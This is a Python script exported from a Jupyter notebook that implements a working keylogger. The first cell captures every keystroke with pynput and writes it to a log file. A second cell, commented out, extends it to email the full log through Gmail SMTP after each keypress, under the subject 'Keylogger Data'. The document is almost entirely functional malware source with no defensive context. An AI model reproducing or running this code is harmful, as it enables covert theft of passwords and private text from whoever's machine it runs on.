#!/usr/bin/env python
# coding: utf-8

# In[ ]:


from pynput.keyboard import Listener, Key
import logging

# Set the log file path
log_file = "C:\\Users\\vik\\Desktop\\project_2\\mylog.txt"

# Configure the logger
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s - %(message)s')

# Define the callback function for key press events
def on_press(key):
    if hasattr(key, 'char'):
        # Handle alphanumeric characters
        logging.info(key.char)
        print(key.char, end="")
    elif key == Key.space:
        # Handle space character
        logging.info(' ')
        print(" ", end="")
    elif key == Key.enter:
        # Handle enter key
        logging.info('\n')
        print("\n")
    elif key == Key.tab:
        # Handle tab key
        logging.info('\t')
        print("\t", end="")
    else:
        # Handle special characters
        logging.info(str(key).replace("'", ""))
        print(str(key).replace("'", ""), end="")

# Create a listener
with Listener(on_press=on_press) as listener:
    listener.join()


# In[ ]:





# In[ ]:


# import smtplib
# from email.mime.text import MIMEText
# from email.mime.multipart import MIMEMultipart
# from pynput.keyboard import Listener, Key
# import logging

# # Set the log file path
# log_file = "C:\\Users\\vik\\Desktop\\project_2\\mylog.txt"

# # Set email credentials and parameters
# sender_email = "Sender email address"  # Sender email address
# sender_password = "Sender email password"  # Sender email password
# receiver_email = "Recipient email address"  # Recipient email address
# subject = "Keylogger Data"  # Email subject

# # Configure the logger
# logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s - %(message)s')

# # Define the callback function for key press events
# def on_press(key):
#     if hasattr(key, 'char'):
#         # Handle alphanumeric characters
#         logging.info(key.char)
#         print(key.char, end="")
#     elif key == Key.space:
#         # Handle space character
#         logging.info(' ')
#         print(" ", end="")
#     elif key == Key.enter:
#         # Handle enter key
#         logging.info('\n')
#         print("\n")
#     elif key == Key.tab:
#         # Handle tab key
#         logging.info('\t')
#         print("\t", end="")
#     else:
#         # Handle special characters
#         logging.info(str(key).replace("'", ""))
#         print(str(key).replace("'", ""), end="")
    
#     # Send email with captured data
#     with open(log_file, 'r') as file:
#         data = file.read()
#     send_email(data)

# # Function to send email
# def send_email(body):
#     # Create email message
#     message = MIMEMultipart()
#     message["From"] = sender_email
#     message["To"] = receiver_email
#     message["Subject"] = subject
#     message.attach(MIMEText(body, "plain"))

#     # Send email
#     with smtplib.SMTP("smtp.gmail.com", 587) as server:
#         server.starttls()
#         server.login(sender_email, sender_password)
#         server.sendmail(sender_email, receiver_email, message.as_string())

# # Create a listener
# with Listener(on_press=on_press) as listener:
#     listener.join()


# In[ ]:




